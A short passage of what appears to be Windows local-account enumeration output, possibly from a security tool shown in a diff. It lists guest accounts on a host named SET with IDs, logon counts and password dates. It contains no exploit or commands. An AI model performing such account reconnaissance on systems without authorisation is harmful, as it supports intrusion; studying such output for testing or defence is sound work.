+   Logons Count            :   0
+   Password Last Set       :   6/12/2020 11:22:18 AM
+
+   =================================================================================================
+
+   Computer Name           :   SET
+   User Name               :   GlendaSny
+   User Id                 :   2056
+   Is Enabled              :   True
+   User Type               :   Guest
+   Comment                 :
+   Last Logon              :   1/1/1970 12:00:00 AM
+   Logons Count            :   0
+   Password Last Set       :   6/12/2020 11:22:19 AM
+
+   =================================================================================================
+
+   Computer Name           :   SET
+   User Name               :   GordonBan
+   User Id                 :   2025
+   Is Enabled              :   True
+   User Type               :   Guest
